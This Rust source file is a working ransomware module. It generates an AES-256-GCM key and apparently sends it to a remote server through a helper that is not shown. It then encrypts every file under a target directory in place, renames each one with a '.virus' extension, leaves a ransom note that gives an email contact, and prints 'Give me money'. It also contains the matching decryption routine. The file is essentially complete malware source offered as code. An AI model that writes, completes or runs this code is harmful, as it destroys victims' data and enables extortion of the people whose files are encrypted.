use std::fs;
use ring::{aead::*, rand};

use crate::req;

const EXT: &str = ".virus";

struct Key<'a>{
    key: LessSafeKey,
    vec: [u8; 32],
    dir: &'a str
}

impl<'a> Key<'a>{
    fn new() -> Self{
        let rng = rand::SystemRandom::new();
        let vec: [u8; 32] = rand::generate(&rng).unwrap().expose();
        let key = LessSafeKey::new(UnboundKey::new(&AES_256_GCM, &vec).unwrap());
        Key{key, vec, dir: ""}
    }

    fn from(vec: Vec<u8>, dir: &'a str) -> Self{
        let key = LessSafeKey::new(UnboundKey::new(&AES_256_GCM, &vec).unwrap());
        Key{key, vec: vec.try_into().expect("Error reading key"), dir}
    }
}

fn get_self_dir() -> String{
    std::env::current_exe()
        .map(|d| d.to_str().unwrap().to_owned())
        .unwrap()
}

fn read_key(dir: &str) -> Result<Key, std::io::Error>{
    let msg = "Error reading file!";
    let content = fs::read_to_string(dir)?;
    let key: Vec<u8> = content.split(" ")
        .into_iter()
        .map(|i| i.parse().expect(msg))
        .collect();

    Ok(Key::from(key, dir))
}

fn valid_enc(path: &str, exceptions: (&str, &str, &str)) -> bool{
    !path.ends_with(EXT) && path != exceptions.0 && path != exceptions.1 && path != exceptions.2
}

fn valid_dec(path: &str, exceptions: (&str, &str, &str)) -> bool{
    path.ends_with(EXT) && path != exceptions.0 && path != exceptions.1 && path != exceptions.2
}

fn write_instructions(token: &str, dir: &str) -> Result<(), std::io::Error>{
    let email = "asd@asd.com";
    let instructions = format!("to get your files back, send the following token to {}:\n{}", email, token);

    fs::write(dir, instructions)
}

fn generate_token() -> String{
    let rng = rand::SystemRandom::new();
    let vec: [u8; 16] = rand::generate(&rng).unwrap().expose();
    vec.into_iter().map(|i| i.to_string()).collect()
}

fn encrypt(k: &Key, data: &mut Vec<u8>){
    let rng = rand::SystemRandom::new();

    let iv: [u8; 16] = rand::generate(&rng).unwrap().expose();
    let mut iv = Vec::from(iv);
    iv.truncate(12);

    let nonce = Nonce::assume_unique_for_key(iv.clone().try_into().expect("Error"));
    k.key.seal_in_place_append_tag(nonce, Aad::empty(), data).unwrap();
    data.extend(iv);
}

fn decrypt(k: &Key, data: &mut Vec<u8>){
    let iv: Vec<u8> = data.drain(data.len() - 12..data.len()).collect();
    let nonce = Nonce::assume_unique_for_key(iv.try_into().expect("Error"));
    k.key.open_in_place(nonce, Aad::empty(), data).unwrap();
    data.truncate(data.len() - AES_256_GCM.tag_len());
}

fn encrypt_files(k: &Key, self_dir: &str, dir: &str, token: &str) -> Result<(), std::io::Error>{
    let paths = fs::read_dir(dir)?;
    let inst_path = format!("{}/instructions.txt", dir);
    let _ = write_instructions(token, &inst_path);
    
    for path in paths{
        let path = path.unwrap().path();
        let path = path.as_path();
        let path_str = path.to_str().unwrap();
        
        if path.is_file() && valid_enc(path_str, (k.dir, &inst_path, self_dir)){
            if let Ok(mut content) = fs::read(path){
                encrypt(&k, &mut content);
                let _ = fs::write(&path, content);
                let _ = fs::rename(&path, format!("{}{}", path_str, EXT));
            }
        }else if path.is_dir(){
            encrypt_files(k, self_dir, path_str, token)?
        }
    }

    Ok(())
}

fn decrypt_files(k: &Key, self_dir: &str, dir: &str) -> Result<(), std::io::Error>{
    let paths = fs::read_dir(dir)?;
    let inst_path = format!("{}/instructions.txt", dir);
    let _ = fs::remove_file(&inst_path);
    
    for path in paths{
        let path = path.unwrap().path();
        let path = path.as_path();
        let mut path_str = String::from(path.to_str().unwrap());

        if path.is_file() && valid_dec(&path_str, (k.dir, &inst_path, self_dir)){
            if let Ok(mut content) = fs::read(path){
                decrypt(&k, &mut content);
                let _ = fs::write(&path, content);

                path_str.truncate(path_str.len() - EXT.len());
                let _ = fs::rename(&path, path_str);
            }
        }else if path.is_dir(){
            decrypt_files(&k, self_dir, &path_str)?
        }
    }

    Ok(())
}

pub fn run(target: &str, key_dir: Option<&str>) -> Result<(), std::io::Error>{
    let self_dir = get_self_dir();
    
    match key_dir{
        Some(dir) => {
            let k = read_key(dir)?;
            decrypt_files(&k, &self_dir, target)?;
            println!("Files restored!");
        },
        None => {
            let token = generate_token();
            let k = Key::new();

            if let Ok(_) = req::stash_key(&token, &mut Vec::from(k.vec)){
                encrypt_files(&k, &self_dir, target, &token)?;
                println!("Give me money");
            }
        }
    }

    Ok(())
}
